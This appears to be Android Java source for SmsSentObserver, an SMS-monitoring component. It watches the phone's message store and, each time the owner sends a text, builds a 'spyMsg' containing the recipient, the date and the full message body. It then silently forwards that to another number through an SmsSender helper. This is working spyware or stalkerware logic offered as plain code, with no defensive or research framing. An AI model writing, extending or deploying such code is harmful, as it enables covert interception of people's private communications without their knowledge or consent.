package com.AmygdalaSoftware;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

public class SmsSentObserver extends ContentObserver {
	
	public static final Uri STATUS_URI = Uri.parse("content://sms");
	private static final String TAG = SmsSentObserver.class.getName();
    
    private Context mContext;

	public SmsSentObserver(Handler handler, Context ctx) {
		super(handler);
		this.mContext = ctx;
	}
	
	public boolean deliverSelfNotifications() {
		return true;
	}

	public void onChange(boolean selfChange) {
		try{
	        Cursor sms_sent_cursor = mContext.getContentResolver().query(STATUS_URI, null, null, null, null);
	        if (sms_sent_cursor != null) {
		        if (sms_sent_cursor.moveToFirst()) {
		        	String protocol = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("protocol"));
		        	Log.e(TAG, "protocol : " + protocol);
		        	if(protocol == null){
		        		//String[] colNames = sms_sent_cursor.getColumnNames();
		        		int type = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"));
		        		Log.e(TAG, "SMS Type : " + type);
		        		if(type == 2){
		        			/*
			        		Log.e(TAG, "Id : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("_id")));
			        		Log.e(TAG, "Thread Id : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("thread_id")));
			        		Log.e(TAG, "Address : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")));
			        		Log.e(TAG, "Person : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("person")));
			        		Log.e(TAG, "Date : " + sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("date")));
			        		Log.e(TAG, "Read : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("read")));
			        		Log.e(TAG, "Status : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("status")));
			        		Log.e(TAG, "Type : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("type")));
			        		Log.e(TAG, "Rep Path Present : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("reply_path_present")));
			        		Log.e(TAG, "Subject : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("subject")));
			        		Log.e(TAG, "Body : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body")));
			        		Log.e(TAG, "Err Code : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("error_code")));
			        		if(colNames != null){
			        			for(int k=0; k<colNames.length; k++){
			        				Log.e(TAG, "colNames["+k+"] : " + colNames[k]);
			        			}
			        		}
			        		*/
		        			
		        			String spyMsg = "From: " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")) + 
		        					". Date: " + sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("date")) + 
		        					". Message: " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body"));
		        			SmsSender.getInstance(this.mContext).sendSms(spyMsg);
		        		}
		        	}
		        }
	        }
	        else
	        	Log.e(TAG, "Send Cursor is Empty");
		}
		catch(Exception sggh){
			Log.e(TAG, "Error on onChange : "+sggh.toString());
		}
		super.onChange(selfChange);
	}

	
}
